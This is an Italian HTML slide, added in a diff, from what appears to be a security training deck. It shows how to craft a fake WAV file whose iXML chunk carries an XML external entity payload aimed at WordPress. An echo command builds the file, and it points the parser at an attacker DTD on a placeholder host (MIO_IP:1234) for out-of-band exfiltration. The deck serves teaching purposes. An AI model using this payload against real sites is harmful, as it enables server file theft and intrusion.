@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Creazione Payload (WAV + iXML) - Slide 7</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Weaponization: Costruire il Cavallo di Troia (WAV)</h1>
+        <div class="subtitle">Creazione Payload (WAV + iXML)</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Azione</div>
+                <div class="card-text">
+                    <p><strong>File:</strong> <code>poc.wav</code></p>
+                    <p><strong>Hex/Code:</strong></p>
+                    <div class="code-box">echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://MIO_IP:1234/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Spiegazione Tecnica</div>
+                <div class="card-text">
+                    <p><strong>Anatomia del file:</strong> Non è un vero audio.</p>
+                    <ul>
+                        <li><code>RIFF...WAVE</code>: Header standard per dire "Sono un file audio".</li>
+                        <li><code>iXML</code>: Il chunk magico che WordPress cercherà di leggere.</li>
+                    </ul>
+                    <p><strong>Il Payload XML:</strong> Definisce un'entità <code>%remote</code> che punta al nostro server. Dice al parser: <em>"Scarica ed esegui le istruzioni contenute in <code>evil.dtd</code>"</em>.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 7;</script>
+    <script src="main.js"></script>
+</body>
+</html>
